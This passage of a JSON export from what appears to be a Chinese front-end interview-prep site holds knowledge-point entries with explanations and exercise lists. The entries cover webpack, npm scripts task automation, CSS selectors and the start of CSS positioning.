        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:32:00.000Z",
        "updateAt": "2024-01-25T19:06:44.000Z"
      },
      {
        "exerciseKey": "c4765da3-f74e-4190-b3c0-7b66f5cd05b0",
        "title": "如何提高webpack的打包速度",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:59:45.000Z",
        "updateAt": "2021-07-07T00:11:01.000Z"
      },
      {
        "exerciseKey": "ce8cb922-4de0-429b-9036-63d1dc387af9",
        "title": "webpack的热更新是如何做到的？说明其原理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:00:49.000Z",
        "updateAt": "2021-07-07T00:11:03.000Z"
      },
      {
        "exerciseKey": "dc78e2f9-568a-445d-988c-594092179848",
        "title": "聊聊 vite 和 webpack 的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-04-27T11:27:02.000Z",
        "updateAt": "2024-08-10T17:07:15.000Z"
      },
      {
        "exerciseKey": "fcdd893d-e614-47c9-9876-1d2a21af556d",
        "title": "谈谈你对 Webpack的认识",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:49:01.000Z",
        "updateAt": "2024-09-21T02:07:54.000Z"
      },
      {
        "exerciseKey": "fe099894-7e1f-4b13-bc0a-8f065b7b4616",
        "title": "webpack的构建流程是什么",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T14:56:56.000Z",
        "updateAt": "2021-07-07T00:10:55.000Z"
      }
    ]
  },
  "110": {
    "id": 110,
    "tagId": 28,
    "title": "任务自动化",
    "explanation": "在前端开发中，我们经常需要执行各种重复性任务，比如编译代码、启动本地服务器、监听文件变化、运行测试、部署代码等。虽然可以使用不同的工具来完成这些任务，但`npm`本身提供了一个强大的功能：`npm scripts`。通过`npm scripts`，我们可以将这些任务脚本化并集中管理，从而提高开发效率。本文将专注于如何使用`npm scripts`自动化前端开发任务，以及它在项目管理中的作用。\n\n### 什么是`npm scripts`？\n\n`npm scripts`是`npm`提供的一种机制，允许我们在项目的`package.json`文件中定义一组命令，方便执行各种任务。在`package.json`文件中，`scripts`字段可以包含多个脚本，每个脚本都是一个键值对，其中键是脚本的名称，值是实际要执行的命令。例如：\n\n```\n{\n  \"scripts\": {\n    \"build\": \"webpack --config webpack.config.js\",\n    \"test\": \"jest\"\n  }\n}\n```\n\n在上面的示例中，定义了两个脚本：`build` 和 `test`。可以通过以下方式在命令行中运行这些脚本：\n\n```\nnpm run build\nnpm run test\n```\n\n`npm`会执行对应的命令，自动帮我们完成编译和测试任务。\n\n### 为什么使用`npm scripts`？\n\n在现代前端开发流程中，自动化任务是不可或缺的，而`npm scripts`的使用有以下几大优势：\n\n1.  **减少对全局依赖的需求**：在传统项目中，开发者通常需要全局安装各种命令行工具，如`webpack`、`eslint`、`babel`等。而`npm scripts`可以直接调用项目的本地依赖，无需全局安装。这确保了不同开发环境中的工具版本一致，减少了版本冲突和兼容性问题。\n2.  **集中管理任务**：`npm scripts`将所有任务定义集中在`package.json`文件中，项目中的所有开发人员都可以直观地看到可用的任务列表，无需了解每个工具的详细使用方法。只需运行`npm run <task>`，便可一键完成常见任务。\n3.  **支持跨平台执行**：`npm scripts`中的命令可以跨平台使用，在Windows、macOS和Linux系统上表现一致，尤其适合团队协作。\n4.  **便于组合和链式执行**：`npm`允许通过逻辑操作符来组合脚本，实现复杂任务的自动化执行。例如可以通过`&&`和`||`来串联多个任务，使得多个步骤一次完成。\n\n### 如何定义和使用`npm scripts`？\n\n让我们通过具体的示例来看看`npm scripts`如何自动化前端开发任务。\n\n#### 1\\. 设置基本的开发任务\n\n假设我们正在开发一个React项目，我们可以在`package.json`中定义以下基本任务：\n\n```\n{\n  \"scripts\": {\n    \"start\": \"webpack serve --mode development\",\n    \"build\": \"webpack --mode production\",\n    \"test\": \"jest\",\n    \"lint\": \"eslint src/**/*.js\"\n  }\n}\n```\n\n这里的脚本分别执行以下任务：\n\n+   `npm run start`：使用Webpack启动开发服务器，运行在开发模式下。\n+   `npm run build`：构建项目并打包为生产环境代码。\n+   `npm run test`：使用`jest`运行单元测试。\n+   `npm run lint`：使用`eslint`检查`src`目录下的JavaScript代码格式。\n\n通过定义这些脚本，我们可以一键运行开发服务器、构建项目、测试代码和检查代码风格，而不必在每次执行命令时记住各个工具的具体参数。\n\n#### 2\\. 监听文件变化自动化任务\n\n在前端开发中，我们通常希望在代码更改后自动执行某些任务。例如，自动运行测试或代码格式检查。我们可以利用`--watch`参数来实现这一目的：\n\n```\n{\n  \"scripts\": {\n    \"test:watch\": \"jest --watch\",\n    \"lint:watch\": \"chokidar 'src/**/*.js' -c 'npm run lint'\"\n  }\n}\n```\n\n这里：\n\n+   `test:watch`使用Jest的`--watch`模式，当代码发生变动时自动重新运行测试。\n+   `lint:watch`使用`chokidar`工具监视`src`目录中的JavaScript文件。如果文件有变化，就会自动执行`lint`任务。\n\n这样，我们在开发过程中只需启动这些监听脚本，当文件发生变化时，测试和代码检查会自动执行，大大提高了开发效率。\n\n#### 3\\. 链式执行任务\n\n在实际开发中，有时需要将多个任务按顺序执行。例如，在构建项目时，先清理旧的构建文件夹，然后执行代码检查，最后进行打包。我们可以用`&&`来串联这些命令：\n\n```\n{\n  \"scripts\": {\n    \"clean\": \"rimraf dist\",\n    \"prebuild\": \"npm run clean && npm run lint\",\n    \"build\": \"npm run prebuild && webpack --mode production\"\n  }\n}\n```\n\n在这个示例中：\n\n+   `clean`任务使用`rimraf`工具删除`dist`目录中的旧文件。\n+   `prebuild`任务先执行`clean`，然后运行`lint`。\n+   `build`任务会先运行`prebuild`，再进行项目的生产环境打包。\n\n通过将任务串联起来，我们确保项目在打包前先清理旧文件并检查代码格式，减少了出错的可能性。\n\n#### 4\\. 使用`pre`和`post`钩子自动执行相关任务\n\n`npm scripts`支持`pre`和`post`钩子，可以在任务的前后自动执行相关任务。例如，我们可以定义`prebuild`和`postbuild`脚本，在`build`任务之前和之后分别执行。\n\n```\n{\n  \"scripts\": {\n    \"prebuild\": \"echo 'Preparing to build...'\",\n    \"build\": \"webpack --mode production\",\n    \"postbuild\": \"echo 'Build completed!'\"\n  }\n}\n```\n\n在运行`npm run build`时：\n\n+   `npm`会先执行`prebuild`，输出`Preparing to build...`。\n+   然后执行`build`脚本，运行Webpack进行打包。\n+   最后执行`postbuild`，输出`Build completed!`。\n\n这样，我们可以在任务执行前后插入自定义逻辑，帮助我们更好地管理任务执行流程。例如，可以在`pretest`钩子中准备测试环境，或者在`posttest`钩子中清理临时文件。\n\n### 进阶：使用环境变量控制行为\n\n在一些场景下，我们可能需要根据环境变量来调整脚本的行为。例如，根据不同的环境（开发、测试、生产）来加载不同的配置。在`npm scripts`中，可以通过`process.env`访问环境变量。\n\n假设我们希望在构建时区分环境，可以这样设置：\n\n```\n{\n  \"scripts\": {\n    \"build:dev\": \"NODE_ENV=development webpack --mode development\",\n    \"build:prod\": \"NODE_ENV=production webpack --mode production\"\n  }\n}\n```\n\n在上面的例子中：\n\n+   `build:dev`任务会将`NODE_ENV`设置为`development`，然后运行Webpack的开发模式。\n+   `build:prod`任务会将`NODE_ENV`设置为`production`，然后运行Webpack的生产模式。\n\n在JavaScript代码中可以通过`process.env.NODE_ENV`访问这些环境变量，从而加载不同的配置文件或启用不同的功能。这样可以灵活地控制构建行为，满足不同环境下的需求。\n\n### 常用工具组合\n\n为了提升`npm scripts`的功能，前端开发中常会借助一些第三方工具。以下是一些常用工具，可以和`npm scripts`一起使用：\n\n+   **rimraf**：用于跨平台删除文件或文件夹，类似`rm -rf`。适合清理构建目录。\n+   **chokidar-cli**：用于文件监听，支持监控文件变化并触发相应任务。\n+   **concurrently**：允许并行运行多个脚本。例如，可以同时启动前端和后端服务。\n+   **cross-env**：用于跨平台设置环境变量。适合在Windows和Linux系统上统一环境变量设置。\n\n### 总结\n\n`npm scripts` 是一个强大的工具，能够帮助前端开发者自动化日常开发任务，包括启动服务器、编译代码、运行测试、监听文件变化等。通过合理配置`npm scripts`，可以减少对外部任务管理工具的依赖，将所有任务集中在`package.json`中进行管理，使项目更加统一和可维护。\n\n掌握并利用`npm scripts`，你可以大幅提高开发效率，让日常开发任务变得更加自动化和高效。在现代前端开发中，合理使用`npm scripts`不仅仅是便利，更是提高团队协作和项目可维护性的关键步骤。",
    "testPoint": "\n\n1. **任务自动化的概念**：理解任务自动化的定义、目的和重要性。\n\n2. **npm scripts基础**：\n   - 如何在`package.json`中定义npm脚本。\n   - 使用`npm run <script-name>`执行脚本的方法。\n   - npm脚本的生命周期钩子（如`pre`和`post`）及其用法。\n\n3. **npm scripts进阶**：\n   - 如何在npm脚本中使用环境变量。\n   - 如何通过npm脚本调用其他命令行工具或脚本。\n   - npm脚本的并行和串行执行策略。\n\n4. **其他任务自动化工具**：\n   - 列举并比较Gulp、Grunt、Make等任务自动化工具的特点和适用场景。\n   - 了解这些工具的基本配置和使用方法。\n\n5. **任务自动化的实践**：\n   - 如何根据项目需求选择合适的任务自动化工具。\n   - 如何编写和维护清晰、可复用的任务自动化脚本。\n   - 如何将任务自动化脚本集成到持续集成/持续部署（CI/CD）流程中。\n\n6. **性能优化**：\n   - 如何通过任务自动化工具优化构建和部署过程。\n   - 如何利用缓存、并行处理等技术提高任务执行效率。\n",
    "exerciseKeyList": "[\"0568e8ee-d540-4b5a-bb66-7ed7add20e41\",\"4b69ba73-7add-4fbe-9aa3-615541823ac6\",\"db24eaf9-ddf2-476b-ba63-03b7520cdaca\",\"3e0910ed-8340-47cd-a428-db2409431a94\",\"9c1de688-32b0-4672-9ac7-c30c86b70b79\",\"b6d72acf-0360-4fc1-8835-6a6f8a3a4025\",\"92fa7f2d-4f03-469b-84bd-82d693022802\",\"afe26637-d92a-43be-a4e4-e55b1a6d3d02\",\"1b2049cf-9800-420d-b4f3-09238226d162\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T09:27:32.000Z",
    "updateAt": "2025-07-17T15:20:45.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0568e8ee-d540-4b5a-bb66-7ed7add20e41",
        "title": "npm script 了解多少？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:58:39.000Z"
      },
      {
        "exerciseKey": "1b2049cf-9800-420d-b4f3-09238226d162",
        "title": "npm 是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-08T14:56:40.000Z",
        "updateAt": "2021-07-11T11:17:42.000Z"
      },
      {
        "exerciseKey": "3e0910ed-8340-47cd-a428-db2409431a94",
        "title": "npm script 生命周期有哪些?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:06:43.000Z"
      },
      {
        "exerciseKey": "4b69ba73-7add-4fbe-9aa3-615541823ac6",
        "title": "npm lock 文件了解多少？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:01:39.000Z"
      },
      {
        "exerciseKey": "92fa7f2d-4f03-469b-84bd-82d693022802",
        "title": "说说你对 pnpm 的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-09T12:34:22.000Z",
        "updateAt": "2024-08-10T17:07:01.000Z"
      },
      {
        "exerciseKey": "9c1de688-32b0-4672-9ac7-c30c86b70b79",
        "title": "npm 中的“幽灵依赖”是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-16T12:08:44.000Z"
      },
      {
        "exerciseKey": "afe26637-d92a-43be-a4e4-e55b1a6d3d02",
        "title": "npm 和 yarn有哪些不一样的地方？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-16T12:00:36.000Z",
        "updateAt": "2024-08-10T17:06:11.000Z"
      },
      {
        "exerciseKey": "b6d72acf-0360-4fc1-8835-6a6f8a3a4025",
        "title": "相比于npm和yarn，pnpm的优势是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-09T12:34:30.000Z",
        "updateAt": "2024-08-10T17:07:02.000Z"
      },
      {
        "exerciseKey": "db24eaf9-ddf2-476b-ba63-03b7520cdaca",
        "title": "说说你对 npm 包管理的了解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:03:40.000Z"
      }
    ]
  },
  "111": {
    "id": 111,
    "tagId": 11,
    "title": "选择器",
    "explanation": "## CSS选取器分类\n\n### 通配符选择器\n\n```css\n*{\n    margin:0;\n    padding:0;\n}\n```\n\n### 元素（标签）选择器\n\n```css\np{\n    color:red;\n}\n```\n\n### 类选择器\n\n```css\n.warning{\n    color:red;\n}\n```\n\n### ID选择器\n\n```css\n#warning{\n    color:red;\n}\n```\n\n**优先级**\n\n> !important>行内样式>ID选择器>类、伪类、属性>元素、伪元素>继承>通配符\n\n### 属性选取器\n\n示例html\n\n```html\n<ul>\n    <li foo>1</li>\n    <li foo=\"abc\">2</li>\n    <li foo=\"abc efj\">3</li>\n    <li foo=\"abcefj\">4</li>\n    <li foo=\"efjabc\">5</li>\n    <li foo=\"ab\">6</li>\n</ul>\n```\n\n![html](https://static.ecool.fun//article/201a9b4e-f6e0-4cd0-9368-1be8df9acf0b.png)\n\n**\\[attribute\\]**\n\n```css\n[foo]{\n    background-color:red;\n}\n```\n\n> 选择所有带 `foo` 属性的元素\n\n![view](https://static.ecool.fun//article/ec68b4a7-30da-40c8-afe1-fbe0447d3706.png)\n\n#### \\[attribute=value\\]\n\n> 选择 attribute=value 的所有元素。\n\n```css\n[foo=abc]{\n    background-color:red;\n}\n```\n\n![view](https://static.ecool.fun//article/900da7af-268f-4843-b529-c40ead5fa18b.png)\n\n#### \\[attribute~=value\\]\n\n> 选择 attribute 属性包含单词 value 的所有元素。\n\n```css\n[foo~=abc]{\n    background-color:red;\n}\n```\n\n![view](https://static.ecool.fun//article/95ac75f3-aff7-4da6-b5fe-c679670597ea.png)\n\n#### \\[attribute^=value\\]\n\n> 选择其 attribute 属性值以 value 开头的所有元素。类似正则的 `^`,以什么开始\n\n```css\n[foo^=abc]{\n    background-color:red;\n}\n```\n\n![view](https://static.ecool.fun//article/f7baeb90-2706-49dd-ac3a-8c5dd9fed415.png)\n\n#### \\[attribute$=value\\]\n\n> 选择其 attribute 属性值以 value 结束的所有元素。类似正则的 `$`,以什么结束\n\n```css\n[foo$=abc]{\n    background-color:red;\n}\n```\n\n![view](https://static.ecool.fun//article/12df6b44-1739-4047-b206-46a91e96f9d2.png)\n\n#### \\[attribute\\*=value\\]\n\n> 选择其 attribute 属性中**包含** `value` **子串**的每个元素。\n\n```css\n[foo*=abc]{\n    background-color:red;\n}\n```\n\n![view](https://static.ecool.fun//article/36e06983-5cfa-4cb7-9b1b-c0f66f0dbd83.png)\n\n#### \\[attribute|=value\\]\n\n> 选择 `attribute` 属性值以 `value` 开头的所有元素。\n\n```css\n[foo|=abc]{\n    background-color:red;\n}\n```\n\n![view](https://static.ecool.fun//article/7d05b816-547e-4f00-a49e-33db8a75538f.png)\n\n### 文档结构选择器\n\n示例html\n\n```html\n<ul>\n    <li>\n        <h1>h1</h1>\n        <p>p1</p>\n    </li>\n    <li>\n        <h1>h1</h1>\n        <p>p1</p>\n    </li>\n</ul>\n```\n\n![html](https://static.ecool.fun//article/aed945e0-9c98-45e4-bb68-24ffcb86fd25.png)\n\n#### 后代选择器 element element\n\n> 选择 element 元素内部的所有 element 元素。\n\n```css\nul li{\n    border: 1px solid red;\n}\n```\n\n![html](https://static.ecool.fun//article/8e9694b1-e55e-486c-9164-1ae994f1b70c.png)\n\n#### 子选择器 element>element\n\n> 选择父元素为 element 元素的所有 element 子元素。\n\n```css\n ul>li>p{\n   border: 1px solid red;\n}\n```\n\n![html](https://static.ecool.fun//article/3484d2dd-401a-490d-bf20-3bf6e7ace74f.png)\n\n#### 相邻兄弟选择器 element+element\n\n> 选择紧接在 element元素之后的 element 元素。\n\n示例html\n\n```html\n<div>\n    <h1>h1</h1>\n    <p>p1</p>\n    <p>p2</p>\n    <p>p3</p>\n</div>\n```\n\n![html](https://static.ecool.fun//article/a2447668-daff-45d9-8f49-7f53b954cca3.png)\n\n```css\nh1+p{\n    color:red;\n}\n```\n\n![html](https://static.ecool.fun//article/a7621ef4-471b-48d2-a7be-d272ea356614.png)\n\n#### 一般兄弟选择器 element1~element2\n\n> 选择前面有 element1 元素的每个 elem 元素。\n\n示例html\n\n```html\n<div>\n    <h1>h1</h1>\n    <p>p1</p>\n    <p>p2</p>\n    <p>p3</p>\n</div>\n```\n\n![html](https://static.ecool.fun//article/bd3e2a13-9981-4966-bed1-362c9218f0c2.png)\n\n```css\n h1~p{\n   border: 1px solid red;\n}\n```\n\n![html](https://static.ecool.fun//article/74345dd2-fcae-45eb-8028-90e36aa654e7.png)\n\n### 伪类选择器\n\n#### :root 文档根元素伪类\n\n```css\n:root{\n    background-color:red;\n}\n```\n\n#### :nth-child(n) 孩子选择器\n\n示例html\n\n```html\n<div>\n    <h1>h1</h1>\n    <p>p1</p>\n    <p>p2</p>\n    <p>p3</p>\n</div>\n```\n\n![html](https://static.ecool.fun//article/784e8a52-fed2-4a03-bec9-da72ea1ba4b1.png)\n\n```css\ndiv :nth-child(1){\n    color:red;\n}\n```\n\n![html](https://static.ecool.fun//article/b0dc4d02-3d13-428f-84ab-0c262e24a306.png)\n\n#### :nth-of-type(n) 同类型的第n个元素\n\n```css\ndiv p:nth-of-type(2){\n    color: red;\n}\n```\n\n![html](https://static.ecool.fun//article/75406f5a-4996-41e2-a881-4b723a957443.png)\n\n#### element:first-child\n\n> 选择属于父元素element的第一个子元素。 等同 :nth-child(1)\n\n#### element:last-child\n\n> 选择属于父元素element的最后一个子元素。\n\n#### element:first-of-type\n\n> 同类型的第一个子元素\n\n#### element:last-of-type\n\n> 同类型的最后一个子元素\n\n#### element:only-child\n\n> 选择了父元素 element 唯一的子元素\n\n示例html\n\n```html\n<div>\n    <h1>h1</h1>\n    <p>p1</p>\n    <p>p2</p>\n    <p>p3</p>\n</div>\n<div>\n    <h1>h2</h1>  \n</div>\n```\n\n```css\n div :only-child{\n    color: red;\n }\n```\n\n最终生效的元素的 div标签下面只有一个元素的 h1 ,即 内容 h2 变成红色，符合条件的都会改变\n\n#### :empty 没有子元素\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<style> \np:empty\n{\nwidth:100px;\nheight:20px;\nbackground:#ff0000;\n}\n</style>\n</head>\n<body>\n\n<h1>这是标题</h1>\n<p>第一个段落。</p>\n<p></p>\n<p>第三个段落。</p>\n<p>第四个段落。</p>\n<p>第五个段落。</p>\n\n</body>\n</html>\n```\n\n生效的是 `<p></p>`,没有子元素\n\n#### :nth-last-child(n) 倒数第n个子元素\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<style> \ndiv :nth-last-child(1){\n    color:red;\n}\n</style>\n</head>\n<body>\n    <div>\n        <p>第一个段落。</p>\n        <p>第二个段落。</p>\n        <p>第三个段落。</p>\n        <p>第四个段落。</p>\n        <p>第五个段落。</p>\n    </div>\t\n</body>\n</html>\n```\n\n父元素div的倒数第一个元素 被选中\n\n#### element:nth-last-of-type(n)\n\n> 同类型的倒数第n个子元素\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<style> \ndiv p:nth-last-of-type(2){\n\tcolor:red;\n}\n</style>\n</head>\n<body>\n  <div>\n    <h1>h11</h1>\n    <p>第一个段落。</p>\n    <p>第二个段落。</p>\n    <p>第三个段落。</p>\n    <h1>h11</h1>\n    <p>第四个段落。</p>\n    <p>第五个段落。</p>\n    <h1>h11</h1>\n  </div>\t\n</body>\n</html>\n```\n\n> `<p>第四个段落。</p>` 处于同类型 p标签 倒数第2个\n\n```css\ndiv p:nth-last-of-type(2n+1){\n\tcolor:red;\n}\n```\n\n> 2n+1(odd):奇数、2n(even)：偶数\n\n#### element:last-of-type\n\n> 同类型的倒数第一个子元素\n\n#### element:first-of-type\n\n> 同类型的第一个子元素\n\n#### element:only-of-type\n\n> 父元素里唯一同类型子元素\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<style> \n\ndiv h1:only-of-type{\n    color: red;\n}\n\n</style>\n</head>\n<body>\n<div>\n    <h1>h1</h1>\n    <p>p1</p>\n    <p>p2</p>\n    <p>p3</p>\n    <h1>h1</h1>\n</div>\n<div>\n    <h1>h2</h1>\n</div>\n</body>\n</html>\n```\n\n> `<h1>h2</h1>` 符合，被选中\n\n#### a:link\n\n> 没有访问过的状态\n\n#### a:active\n\n> 链接正在被点击\n\n#### a:hover\n\n> 选择鼠标指针位于其上的链接。\n\n#### a:visited\n\n> 选择所有已被访问的链接。\n\n#### :focus\n\n> :focus 选择器用于选取获得焦点的元素。\n\n提示：接收键盘事件或其他用户输入的元素都允许 :focus 选择器。\n\n#### :enabled / :disabled\n\n> 选择每个启用的 `input` 元素 / 选择每个禁用的 `input` 元素\n\n#### :checked\n\n> 选择每个被选中的 `input` 元素。自定义开关可以用这个实现\n\n#### :not(selector)\n\n> 选择非 selector 元素的每个元素。（反向选择）\n\n### 伪元素选择器\n\n#### element::first-line\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<style>\n\np:first-line{\n\tbackground-color:yellow;\n}\n\n</style>\n</head>\n<body>\n<h1>WWF's Mission Statement</h1>\n<p>To stop the degradation of the planet's natural environment and to build a future in which humans live in harmony with nature, by; conserving the world's biological diversity, ensuring that the use of renewable natural resources is sustainable, and promoting the reduction of pollution and wasteful consumption.</p>\n</body>\n</html>\n```\n\n> p 元素的第一行发生改变\n\n#### element::first-letter\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<style>\nh1:first-letter{\n\tcolor:yellow;\n}\n</style>\n</head>\n\n<body>\n<h1>WWF's Mission Statement</h1>\n</body>\n</html>\n```\n\n> 直接第一个字符变黄，如果JavaScript做的话，需要获取字符串，再获取第一个字符，再改变其颜色\n\n#### element::before\n\n> 在每个 element 元素的内容之前插入内容。我们更多的可能是当作一个div来用\n\n#### element::after\n\n> 在每个element元素的内容之后插入内容。我们可能更多的是用来清除浮动或验证表单提示等其它\n\n#### ::selection\n\n> 选择被用户选取的元素部分。\n",
    "testPoint": "### 1. **选择器基础**\n   - 请简述 CSS 选择器的概念。选择器的作用是什么？\n   - CSS 选择器分为哪几种类型？请举例说明每种类型。\n     - 元素选择器\n     - 类选择器\n     - ID 选择器\n     - 属性选择器\n     - 伪类选择器\n     - 伪元素选择器\n\n### 2. **基础选择器**\n   - `div`, `.class`, `#id` 分别是什么选择器？它们有什么区别？\n   - 选择器的优先级是如何计算的？请举例说明 CSS 选择器的优先级规则。\n   - 何时应该使用类选择器而不是 ID 选择器？\n   - `*` 通配符选择器的作用是什么？它会影响页面性能吗？\n\n### 3. **组合选择器**\n   - 请解释并举例说明以下组合选择器的用法：\n     - 后代选择器（`space`）：`div p`\n     - 子元素选择器（`>`）：`div > p`\n     - 相邻兄弟选择器（`+`）：`div + p`\n     - 通用兄弟选择器（`~`）：`div ~ p`\n   - 这些组合选择器的作用是什么？它们如何影响元素的匹配范围？\n\n### 4. **属性选择器**\n   - 请解释属性选择器的作用，并举例说明如何使用它们：\n     - `[type=\"text\"]`\n     - `[type^=\"text\"]`\n     - `[type$=\"text\"]`\n     - `[type*=\"text\"]`\n   - 什么是属性选择器的精确匹配、前缀匹配、后缀匹配和包含匹配？它们如何使用？\n\n### 5. **伪类选择器**\n   - 伪类选择器的作用是什么？它们如何帮助实现一些动态效果？\n   - 常见的伪类选择器有哪些？请解释并举例：\n     - `:hover`\n     - `:focus`\n     - `:active`\n     - `:nth-child()`\n     - `:nth-of-type()`\n     - `:first-child` / `:last-child`\n     - `:not()`\n     - `:empty`\n   - 你如何使用 `:nth-child` 或 `:nth-of-type` 来选择特定位置的元素？请举个例子。\n\n### 6. **伪元素选择器**\n   - 伪元素选择器的作用是什么？它们如何与伪类选择器不同？\n   - 常见的伪元素选择器有哪些？请解释并举例：\n     - `::before`\n     - `::after`\n     - `::first-letter`\n     - `::first-line`\n   - 如何使用伪元素来创建内容或装饰元素？\n\n### 7. **组合选择器与继承**\n   - `div p` 和 `div > p` 的区别是什么？它们如何影响子元素的选择范围？\n   - 请解释 CSS 选择器中的继承机制。例如，父元素设置的字体样式如何影响子元素？\n\n### 8. **优先级与权重**\n   - CSS 选择器的优先级计算规则是什么？如何根据选择器的权重来决定样式应用的顺序？\n   - 请给出一个选择器的优先级计算实例，说明如何处理同一元素上有多个规则时的冲突。\n\n### 9. **选择器性能**\n   - 当页面中有大量元素时，如何选择器的选择方式可能影响性能？如何优化选择器以提高页面性能？\n   - `div p`, `div > p` 和 `.class p` 选择器性能的差异是什么？如何选择最优的选择器？\n\n### 10. **CSS 选择器的作用域与继承**\n   - CSS 选择器的作用域是如何影响样式的应用的？在什么情况下需要使用 `!important`？\n   - 请举例说明如何使用 CSS 选择器来设置样式，确保只有特定的元素被影响，不会意外影响到其他部分。\n\n### 11. **特定场景下的选择器**\n   - 如何使用 CSS 选择器来选择偶数行或奇数行的元素？\n   - 如何选择一个列表中除了第一个和最后一个项外的所有元素？\n   - 如何使用 CSS 选择器对特定的表单元素（如文本框或按钮）进行样式设置？\n   - 如何使用选择器来选择所有未完成的任务（例如，待办事项列表中的未选中项）？\n\n### 12. **多重选择器**\n   - 如何使用多个选择器来应用相同的样式？请解释 `,`（逗号）分隔符的作用，并举例。\n   - 在多个选择器匹配时，CSS 是如何应用样式的？它如何处理多个选择器的冲突？",
    "exerciseKeyList": "[\"4ad4e434-9883-480e-a403-f54614a41293\",\"f430e672-45b0-4836-9ef0-09f427900dd4\",\"376fe4ce-b43c-45b3-834b-28da33c56920\",\"efc1bdba-4ded-4d08-846c-cc98cd1d0d58\",\"a180397f-7b8e-421f-964e-ed97bdd57efd\",\"e34edfe5-0ce6-47f8-9de0-b8a1bfe72be0\",\"bbbb61f4-a591-46db-ae66-7884bb682099\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 2,
    "createAt": "2024-10-08T09:21:08.000Z",
    "updateAt": "2024-11-10T05:41:07.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "376fe4ce-b43c-45b3-834b-28da33c56920",
        "title": "css选择器有哪些？优先级分别是什么？哪些属性可以继承？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T09:40:10.000Z",
        "updateAt": "2024-07-22T10:02:41.000Z"
      },
      {
        "exerciseKey": "4ad4e434-9883-480e-a403-f54614a41293",
        "title": "浏览器如何解析css选择器？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T14:27:30.000Z"
      },
      {
        "exerciseKey": "a180397f-7b8e-421f-964e-ed97bdd57efd",
        "title": "CSS3新增伪类有那些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T09:38:17.000Z",
        "updateAt": "2021-07-04T19:23:58.000Z"
      },
      {
        "exerciseKey": "bbbb61f4-a591-46db-ae66-7884bb682099",
        "title": "html 元素节点上， 有多个 class 名称，这几个class 名称对应的样式渲染优先级是如何的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-09-10T10:56:24.000Z"
      },
      {
        "exerciseKey": "e34edfe5-0ce6-47f8-9de0-b8a1bfe72be0",
        "title": "下面代码中，p标签的背景色是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-08T13:35:14.000Z",
        "updateAt": "2022-05-08T21:35:17.000Z"
      },
      {
        "exerciseKey": "efc1bdba-4ded-4d08-846c-cc98cd1d0d58",
        "title": "CSS 伪类和伪元素有哪些，它们的区别和实际应用",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:21:34.000Z"
      },
      {
        "exerciseKey": "f430e672-45b0-4836-9ef0-09f427900dd4",
        "title": "为何CSS不支持父选择器？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-04T13:16:25.000Z",
        "updateAt": "2024-08-10T17:06:35.000Z"
      }
    ]
  },
  "112": {
    "id": 112,
    "tagId": 11,
    "title": "position",
    "explanation": "> CSS 中 `position` 属性用于指定元素的定位方法的类型（`static`、`relative`、`absolute`、`fixed`、`sticky`）。\n\n### 静态定位 position: static\n\n此属性未 HTML 元素默认定位，一个元素没有以任何特殊的方式定位，它总是按照页面的正常流程定位。\n\n在此属性下，属性值 `top`、`left`、`right`、`bottom` 和 `z-index` 对HTML元素没有影响。\n\n```xml\n<div class=\"parent\">\n    <div class=\"child\"></div>\n</div>\n<div class=\"sibling\"></div>\n<style type=\"text/css\">\n    .parent {\n        width: 480px;\n        height: 320px;\n        background-color: #008800;\n    }\n    .child {\n        width: 240px;\n        height: 160px;\n        background-color: #ff0000;\n    }\n    .sibling {\n        width: 240px;\n        height: 160px;\n        background-color: #0000ff;\n    }\n</style>\n```\n\n效果如图：\n\n![2.jpg](https://static.ecool.fun//article/1b87bf46-12e7-4919-8985-5f6d4a6de5fb.jpeg)\n\n> 为什么使用它呢？将元素设置为 `position: static` 的唯一原因是强制删除应用于无法控制的元素上的某些定位。\n\n### 相对定位 position: relative\n\n此属性相对于其正常位置的，在不改变布局的情况下根据元素的当前位置定位元素。\n\n`position: relative` 相对于它的当前位置放置一个元素而不改变它周围的布局。\n\n在此属性下，设置相对定位元素的 `top`、`right`、`bottom` 和 `left` 属性会导致它被调整到远离其正常位置。\n\n```xml\n<div class=\"parent\">\n    <div 